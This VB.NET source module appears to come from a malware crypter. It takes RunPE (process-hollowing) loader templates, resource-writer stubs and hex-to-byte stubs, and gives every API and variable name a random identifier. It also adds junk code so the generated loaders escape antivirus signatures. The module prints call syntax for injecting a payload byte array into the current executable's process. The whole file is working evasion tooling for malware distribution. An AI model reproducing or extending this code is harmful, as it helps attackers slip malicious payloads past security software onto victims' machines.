Imports System.Text
Imports System.IO

Module Functions
    Public nameclassRunPE As String
    Public namefunctionRunPE As String
    Public nameclassRes As String
    Public namefuncRes As String

    Public Function GeneratePassword(ByVal Uppers As Boolean, ByVal Lowers As Boolean, ByVal Numbers As Boolean, ByVal Specials As Boolean, ByVal passwordLength As Integer) As String
        Dim str2 As String = ""
        Dim str3 As String = ""
        If Uppers Then
            str2 = (str2 & "ABCDEFGHIJKLMNOPQRSTUVWXYZ")
        End If
        If Lowers Then
            str2 = (str2 & "abcdefghijklmnopqrstuvwxyz")
        End If
        If Numbers Then
            str2 = (str2 & "0123456789")
        End If
        If Specials Then
            str2 = (str2 & "~`!@#$%^&*()_+=-{[}]|;:'<,>.?")
        End If
        VBMath.Randomize()
        Dim num2 As Integer = (passwordLength - 1)
        Dim i As Integer = 0
        Do While (i <= num2)
            str3 = (str3 & Strings.Mid(str2, CInt(Math.Round(CDbl(((Strings.Len(str2) * VBMath.Rnd) + 1.0!)))), 1))
            i += 1
        Loop
        Return str3
    End Function

    Public Function RunPE1VB()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE1VB
            Dim s As String = "apii9|apii0|apii1|apii2|apii3|apii4|apii5|apii6|apii7|apii8|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)
            Dim m As String = GeneratePassword(True, True, False, False, 11)

            nameclassRunPE = n
            namefunctionRunPE = m

            'sb.AppendLine("'''' <summary>")
            'sb.AppendLine("'''' Coded By GAITH7H3WOLF")
            'sb.AppendLine("'''' Call : Dim x AS New " & n & ": x" & "." & m & "( byte() , String )")
            Form2.TextBox1.Text = "Dim x AS New " & n & ": x" & "." & m & "( byte() ,Application.ExecutablePath)"
            'sb.AppendLine("'''' </summary>")
            '-----------------------     api par      ---------------------------
            src = src.Replace("name", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("method", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("handle", GeneratePassword(True, True, False, False, 4)) ' :)
            src = src.Replace("hThr", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("numRead", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("hProc", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("baseAddr", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("hThread", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("SC", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("addr", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("allocType", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("prot", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("lpBuffer", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("appName", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("commandLine", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("thrAttr", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("inherit", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("creation", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("env", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("curDir", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("sInfo", GeneratePassword(True, True, False, False, 4))
            src = src.Replace("pInfo", GeneratePassword(True, True, False, False, 4))

            src = src.Replace("CreateAPI", GeneratePassword(True, True, False, False, 15))

            src = src.Replace("alaa", n)
            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(7), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(8), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(9), GeneratePassword(True, True, False, False, 6))
            '--------------------     dynmic api   ------------------------------
            s = "api1|api2|api3|api4|api5|api6|api7|"
            ss = Split(s, "|")
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 5))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 5))
            '-------------------------   ReadPtr   -------------------------------
            src = src.Replace("ReadPtr", GeneratePassword(True, True, False, False, 7))
            src = src.Replace("lPtr", GeneratePassword(True, True, False, False, 7))
            src = src.Replace("lSS", GeneratePassword(True, True, False, False, 7))
            src = src.Replace("lRes", GeneratePassword(True, True, False, False, 7))
            src = src.Replace("lBr", GeneratePassword(True, True, False, False, 7))
            '------------------------    iExec     -------------------------------
            'src = src.Replace("'%123%", sttt(10))
            src = src.Replace("iExec", m)
            src = src.Replace("Buffbawa", GeneratePassword(True, True, False, False, 8))
            src = src.Replace("sExe", GeneratePassword(True, True, False, False, 8))
            src = src.Replace("hGC", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("PTA", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("tPI", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("tSI", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("N2", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("IB", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("CNTXT", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("hPE", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("VABA", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("SA", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("SS", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("WRET", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("NOBW", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("Destination", GeneratePassword(True, True, False, False, 9))
            src = src.Replace("B2", GeneratePassword(True, True, False, False, 9))

            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function
    Public Function RunPE1C()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE1C
            Dim s As String = "apii9|apii0|apii1|apii2|apii3|apii4|apii5|apii6|apii7|apii8|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)
            Dim m As String = GeneratePassword(True, True, False, False, 11)

            nameclassRunPE = n
            namefunctionRunPE = m

            Form2.TextBox1.Text = n & "." & m & "( byte(), Process.GetCurrentProcess().MainModule.FileName)"

            src = src.Replace("alaa", n)
            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(7), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(8), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(9), GeneratePassword(True, True, False, False, 6))
            
            src = src.Replace("iExec", m)

            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function RunPE2VB()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE2VB
            Dim s As String = "V1|V2|V3|V4|V5|V6|V7|V8|"
            Dim ss As String() = Split(s, "|")
            Dim n As String = GeneratePassword(True, True, False, False, 21)
            Dim m As String = GeneratePassword(True, True, False, False, 15)

            Form2.TextBox1.Text = n & "." & m & "( byte(), Application.ExecutablePath)"

            src = src.Replace("ModuleNAme", n)
            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(7), GeneratePassword(True, True, False, False, 6))
           
            src = src.Replace("SUB1", m)
            src = src.Replace("Func1", GeneratePassword(True, True, False, False, 8))

            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function
    Public Function RunPE2C()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE2C
            
            Dim n As String = GeneratePassword(True, True, False, False, 40)
            Dim m As String = GeneratePassword(True, True, False, False, 35)

            Form2.TextBox1.Text = n & "." & m & "( byte(), Process.GetCurrentProcess().MainModule.FileName)"

            src = src.Replace("ClassName", n)
            src = src.Replace("FuncName", m)
            '--------------------       api       -------------------------------
            src = src.Replace("a1", GeneratePassword(True, True, False, False, 15))
            src = src.Replace("a2", GeneratePassword(True, True, False, False, 15))
            src = src.Replace("a3", GeneratePassword(True, True, False, False, 12))
            src = src.Replace("a4", GeneratePassword(True, True, False, False, 14))
            src = src.Replace("a5", GeneratePassword(True, True, False, False, 18))
            src = src.Replace("a6", GeneratePassword(True, True, False, False, 16))
            src = src.Replace("a7", GeneratePassword(True, True, False, False, 13))
            src = src.Replace("a8", GeneratePassword(True, True, False, False, 18))
            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function RunPE3VB()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE3VB
            Dim s As String = "V1|V2|V3|V4|V5|V6|V7|V8|V9|V10|V11|V12|V13|V14|V15|V16|V17|V18|V19|V20|V21|V22|"
            Dim ss As String() = Split(s, "|")
            Dim n As String = GeneratePassword(True, True, False, False, 21)
            Dim m As String = GeneratePassword(True, True, False, False, 15)

            Form2.TextBox1.Text = n & "." & m & "( byte(), Application.ExecutablePath)"
            
            src = src.Replace("RunPEClas", n)
            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(7), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(8), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(9), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(10), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(11), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(12), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(13), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(14), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(15), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(16), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(17), GeneratePassword(True, True, False, False, 21))
            src = src.Replace(ss(18), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(19), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(20), GeneratePassword(True, True, False, False, 25))
            src = src.Replace(ss(21), GeneratePassword(True, True, False, False, 25))

            src = src.Replace("Func1", m)
            
            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function
    Public Function RunPE3C()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.RunPE3C
            Dim s As String = "V1|V2|V3|V4|V5|V6|V7|V8|V9|V10|V11|V12|V13|V14|V15|V16|V17|V18|V19|V20|V21|V22|"
            Dim ss As String() = Split(s, "|")
            Dim n As String = GeneratePassword(True, True, False, False, 21)
            Dim m As String = GeneratePassword(True, True, False, False, 15)

            Form2.TextBox1.Text = n & "." & m & "( byte(), Process.GetCurrentProcess().MainModule.FileName)"
            
            src = src.Replace("RunPEClas", n)
            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 6))
            src = src.Replace(ss(7), GeneratePassword(True, True, False, False, 6))

            src = src.Replace("Func1", m)

            Res = src
        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function JunkStringVB(ByVal num As Integer) As String
        Dim out As String = ""
        Dim i As Integer = 0
        For i = 0 To num - 1
            out += "Dim " & GeneratePassword(True, True, False, False, RandomNumber(40, 20)) & " As String = """ & GeneratePassword(True, True, False, False, RandomNumber(500, 100)) & """" & vbNewLine & "'" & GeneratePassword(True, True, False, False, RandomNumber(500, 100)) & vbNewLine
        Next
        Return out
    End Function

    Public Function JunkStringC(ByVal num As Integer) As String
        Dim out As String = ""
        Dim i As Integer = 0
        For i = 0 To num - 1
            out += "String " & GeneratePassword(True, True, False, False, RandomNumber(500, 100)) & """" & vbNewLine & "//" & GeneratePassword(True, True, False, False, RandomNumber(500, 100)) & vbNewLine
        Next
        Return out
    End Function

    Public Function ResourceWriterVB()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.ResWritStubVB
            Dim s As String = "a1|a2|a3|a4|a5|a6|a7|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)
            Dim m As String = GeneratePassword(True, True, False, False, 11)

            src = src.Replace("gaaa", n)
            src = src.Replace("namefunres", m)

            nameclassRes = n
            namefuncRes = m

            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 11))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 10))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 20))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 9))
            Res = src

            Form2.TextBox1.Text = "Namebytes = " & namefuncRes & "(String)"

        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function ResourceWriterC()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.ResWritStubC
            Dim s As String = "a1|a2|a3|a4|a5|a6|a7|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)
            Dim m As String = GeneratePassword(True, True, False, False, 11)

            src = src.Replace("gaaa", n)
            src = src.Replace("namefunres", m)

            nameclassRes = n
            namefuncRes = m

            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, 15))
            src = src.Replace(ss(3), GeneratePassword(True, True, False, False, 11))
            src = src.Replace(ss(4), GeneratePassword(True, True, False, False, 10))
            src = src.Replace(ss(5), GeneratePassword(True, True, False, False, 20))
            src = src.Replace(ss(6), GeneratePassword(True, True, False, False, 9))
            Res = src

            Form2.TextBox1.Text = "Byte[] Name = " & namefuncRes & "(String)"

        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function FileToByteArray(ByVal _FileName As String) As Byte()
        Dim buffer As Byte() = Nothing
        Try
            Dim input As New FileStream(_FileName, FileMode.Open, FileAccess.Read)
            Dim reader As New BinaryReader(input)
            Dim length As Long = New FileInfo(_FileName).Length
            buffer = reader.ReadBytes(CInt(Conversion.Fix(length)))
            input.Close()
            input.Dispose()
            reader.Close()
        Catch exception1 As Exception
            Console.WriteLine("Exception caught in process: {0}", exception1.ToString)
        End Try
        Return buffer
    End Function

    Public Function Hex2ByteVB()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.H2BVB
            Dim s As String = "F1|F2|F3|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)

            src = src.Replace("FFF1", n)

            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))

            Res = src

        Catch ex As Exception
        End Try
        Return Res
    End Function

    Public Function Hex2ByteC()
        Dim Res As String = ""
        Try
            Dim src As String = My.Resources.H2BC
            Dim s As String = "F1|F2|F3|"
            Dim ss As String() = Split(s, "|")
            Dim sb As New StringBuilder
            Dim n As String = GeneratePassword(True, True, False, False, 11)

            src = src.Replace("FFF1", n)

            '--------------------       api       -------------------------------
            src = src.Replace(ss(0), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))
            src = src.Replace(ss(1), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))
            src = src.Replace(ss(2), GeneratePassword(True, True, False, False, RandomNumber(20, 10)))

            Res = src

        Catch ex As Exception
        End Try
        Return Res
    End Function

End Module
